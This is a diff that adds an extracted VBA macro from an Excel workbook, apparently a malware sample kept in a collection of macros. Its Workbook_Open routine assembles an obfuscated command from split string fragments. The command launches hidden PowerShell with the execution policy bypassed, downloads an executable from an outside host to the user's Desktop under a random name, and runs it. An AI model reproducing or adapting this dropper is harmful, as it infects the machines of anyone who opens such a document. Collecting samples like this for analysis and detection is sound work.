@@ -1,0 +1,48 @@
+Filename     : ./macros/08fbbeaf591db12052ee21c11b4465b3e5d1448d6a93f7d57224cd382b707898
+OLE stream   : _VBA_PROJECT_CUR/VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Function naromeopenned()
+If mfHTML > 0 Then
+vizainstudioh = Array(Second(Now), Now(), Minute(Now), Now(), Now(), "eCUTI", Minute(Now), Now(), Now())
+
+sistermodern = Array("as" + "s    """, Minute(Now), Minute(Now), "d  " + " /c""")
+kimleertoster = Array(Now(), "ErShe")
+airpocletsf = Array(Now(), "opRoFi -W", Now())
+staloonerpeas = Array(Second(Now), Now(), Now(), Now(), "deN -N")
+
+demotimerone = Array(Now(), "NOnInt", Now(), Now())
+naromeopenned = "cm" + sistermodern(3) + "pOW" + kimleertoster(1) + "Ll -n" + airpocletsf(1) + "In  hiD" + staloonerpeas(4) + "OLo -" + demotimerone(1) + "eRA  -eX" + vizainstudioh(5) + "oNp bYp" + sistermodern(0)
+End If
+End Function
+
+
+
+
+Sub Workbook_Open()
+If contverresUnverified > 0.9 Then
+Dim bleemsignals As String
+Randomize
+bleemsignals = Int(Rnd * 9999999#)
+techblueand = "$7d0mK6 = [TyPE](\""{1}{0}{3}{2}\"" -f 'on','ENVIr','Nt','mE') ;  "
+engsiniores = "do{&(\""{1}{0}\"" -f'ep','sle') 33;${D`es} =  $7d0mk6::gETfoLDERpATh(\""Desktop\"");(&(\""{0}{1}{2}\"" -f'Ne','w-','Object') "
+rabbeiego = bleemsignals
+baltimoruss = "(\""{0}{2}{1}{3}{5}{6}{4}\""-f'Sy','te','s','m.Ne','ent','t.Web','Cli')).dowNLoaDFilE.iNVoKE(\""http://bobindrama.com/hope\"",\""$Des\" + rabbeiego + ".exe\"")}"
+familiesnames = "while(!${?});&(\""{0}{2}{3}{1}\""-f 'St','ocess','art','-Pr') $Des\" + rabbeiego + ".exe"""
+rubicvonv = techblueand + engsiniores + baltimoruss + familiesnames
+Shell naromeopenned + rubicvonv, fmTabStyleTabs
+End If
+End Sub
+
+
+
+
+
